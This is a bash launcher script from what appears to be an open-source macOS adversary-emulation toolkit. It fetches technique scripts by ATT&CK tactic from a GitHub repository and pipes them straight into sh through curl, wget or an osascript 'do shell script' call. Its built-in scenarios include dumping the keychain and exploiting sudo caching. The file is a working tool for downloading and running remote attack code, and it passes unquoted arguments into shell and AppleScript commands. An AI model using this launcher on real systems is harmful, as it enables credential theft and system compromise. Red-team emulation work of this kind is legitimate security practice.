#!/bin/bash

# Name: attackmacos.sh
# Platform: macOS
# Author: @darmado | x.com/darmad0
# Date: 2023-10-06
# Version: 1.3
# Last Modified: 2024-10-28
# Created: 2023-09-30
# License: Apache 2.0
# Repository: https://github.com/darmado/attack-macOS
# Description: Tool to fetch and execute scripts from the attack-macOS repository
# Dependencies: curl, wget, osascript (optional)

# URL template for fetching scripts from GitHub
GIT_URL="https://raw.githubusercontent.com/darmado/attack-macOS/main/ttp/{tactic}/{ttp}"

# Function to display ASCII Art Banner
display_banner() {
	cat << "EOF"

	
                                  █████████████████
                  ███████████████████████████████████████████████
                 █            █████████████████████████          █
                ██               ███████████████████             ██
                ██                ████████████████              ██
                ██                 █████   ██████                ██
                 █                                               █
                 █                                               █
                ███     █                                 █     ███
                ████   █████                          ██████   ████
               ██████  ████████                    █████████  ██████
               ██████   ███████████            ███████████   ██████
               ██████    ████████████        █████████████    ██████
              ██████      ████████████      █████████████     ██████
               ██████      ██████████        ███████████     ██████
            ██████                                             ███████
              ███  ████                ████               ████   ██
             ███  █████                ██               ██████   ███
          ██  ██ ███ █████                            ██████ █████  █
              ██  ████ ████████                    ████████ ████  ██
              █████ ██ ████████████████████████████████████  ██ █ ███
                ████      ███████████████████████████████      ███
                 █           █████████████████████████          █
                                 ████████████████

                         A  t  t  a  c  k  m  a  c  O  S


Shell | JXA | Swift | Python | Perl | Ruby | STIX 2.1 | ATT&CK V.15 | Apache 2.0 | v.0.9

EOF
}

# Function to display help
display_help() {
	cat << EOF
Usage: attackmacos.sh [--method <method>] --tactic <Tactic> --ttp <TTP> [--args <arguments>]

Methods:
  curl                   Use curl to download the script (default).
  wget                   Use wget to download the script.
  osascript              Use AppleScript to download the script.
  local                  Execute the script locally.

Required arguments:
  --tactic <Tactic>      Specify the tactic.
  --ttp <TTP>            Specify the TTP.

Optional arguments:
  --method <method>      Specify the method (default: curl).
  --args <arguments>     Specify arguments for the TTP script.
  -h, --help             Display this help message.

Tactics: reconnaissance, resource_development, initial_access, execution, persistence,
         privilege_escalation, defense_evasion, credential_access, discovery,
         lateral_movement, collection, command_and_control, exfiltration, impact

Examples:
  ./attackmacos.sh --method curl --tactic credential_access --ttp accounts --args='--help'
  ./attackmacos.sh --tactic discovery --ttp accounts --args='--verbose --log'
  ./attackmacos.sh --method local --tactic execution --ttp run_script --args='-s'
EOF
}

# Function to execute locally
execute_local() {
	local tactic="$1"
	local ttp="$2"
	local args="$3"
	local LOCAL_PATH="./ttp/$tactic/$ttp"

	if [ -f "$LOCAL_PATH" ]; then
		echo "Executing local script: $LOCAL_PATH -- $args"
		sh "$LOCAL_PATH" $args  
	else
		echo "Error: Script not found at $LOCAL_PATH"
		exit 1
	fi
}

# Function to execute using curl
execute_curl() {
	local tactic="$1"
	local ttp="$2"
	local args="$3"
	local url="${GIT_URL/\{tactic\}/$tactic}"
	url="${url/\{ttp\}/$ttp}"
	echo "Executing with curl: $url -- $args"
	curl -sSL "$url" | sh -s -- $args
}

# Function to execute using wget
execute_wget() {
	local tactic="$1"
	local ttp="$2"
	local args="$3"
	local url="${GIT_URL/\{tactic\}/$tactic}"
	url="${url/\{ttp\}/$ttp}"
	echo "Executing with wget: $url -- $args"
	wget -qO- "$url" | sh -s -- $args
}

# Function to execute using osascript
execute_osascript() {
	local tactic="$1"
	local ttp="$2"
	local args="$3"
	local url="${GIT_URL/\{tactic\}/$tactic}"
	url="${url/\{ttp\}/$ttp}"
	echo "Executing with osascript: $url -- $args"
	osascript -e "do shell script \"curl -sSL '$url' | sh -s -- $args\""
}

# Function to get tactics
get_tactics() {
	echo "reconnaissance resource_development initial_access execution persistence privilege_escalation defense_evasion credential_access discovery lateral_movement collection command_and_control exfiltration impact"
}

# Function to get TTPs for a given tactic
get_ttps() {
	local tactic=$1
	ls "./ttp/$tactic" 2>/dev/null || echo "No TTPs found for $tactic"
}

# Function to generate a list of common attack scenarios
get_attack_scenarios() {
	cat << EOF
Reconnaissance|discovery|network_share_discovery|--args="-v"
Initial Access|initial_access|phishing|--args="--target employee@company.com"
Credential Access|credential_access|keychain|--args="--dump"
Privilege Escalation|privilege_escalation|sudo_caching|--args="--exploit"
EOF
}

# Function to parse YAML
parse_yaml() {
   local prefix=$2
   local s='[[:space:]]*' w='[a-zA-Z0-9_]*' fs=$(echo @|tr @ '\034')
   sed -ne "s|^\($s\):|\1|" \
        -e "s|^\($s\)\($w\)$s:$s[\"']\(.*\)[\"']$s\$|\1$fs\2$fs\3|p" \
        -e "s|^\($s\)\($w\)$s:$s\(.*\)$s\$|\1$fs\2$fs\3|p"  $1 |
   awk -F$fs '{
      indent = length($1)/2;
      vname[indent] = $2;
      for (i in vname) {if (i > indent) {delete vname[i]}}
      if (length($3) > 0) {
         vn=""; for (i=0; i<indent; i++) {vn=(vn)(vname[i])("_")}
         printf("%s%s%s=\"%s\"\n", "'$prefix'",vn, $2, $3);
      }
   }'
}

# Function to parse STIX JSON
parse_stix_json() {
    local json_file="$1"
    local jq_filter="$2"
    jq -r "$jq_filter" "$json_file"
}

# Simplified interactive interface
interactive_interface() {
	echo "Interactive mode is not fully implemented yet."
	echo "Please use command-line arguments to run specific TTPs."
	display_help
}

# Main function to parse arguments and call the appropriate function
main() {
	local method="curl"
	local tactic=""
	local ttp=""
	local args=""

	# Display banner only when arguments are provided
	display_banner

	while [[ $# -gt 0 ]]; do
		case "$1" in
			--method)
				method="$2"
				shift 2
				;;
			--tactic)
				tactic="$2"
				shift 2
				;;
			--ttp)
				ttp="$2"
				shift 2
				;;
			--args)
				args="$2"
				shift 2
				;;
			-h|--help)
				display_help
				exit 0
				;;
			*)
				echo "Unknown option: $1"
				display_help
				exit 1
				;;
		esac
	done

	if [[ -z "$tactic" || -z "$ttp" ]]; then
		echo "Error: Both --tactic and --ttp are required."
		display_help
		exit 1
	fi

	case "$method" in
		curl)
			execute_curl "$tactic" "$ttp" "$args"
			;;
		wget)
			execute_wget "$tactic" "$ttp" "$args"
			;;
		osascript)
			execute_osascript "$tactic" "$ttp" "$args"
			;;
		local)
			execute_local "$tactic" "$ttp" "$args"
			;;
		*)
			echo "Unsupported method: $method"
			display_help
			exit 1
			;;
	esac
}

# Check if any arguments are provided
if [ "$#" -eq 0 ]; then
	interactive_interface
else
	main "$@"
fi
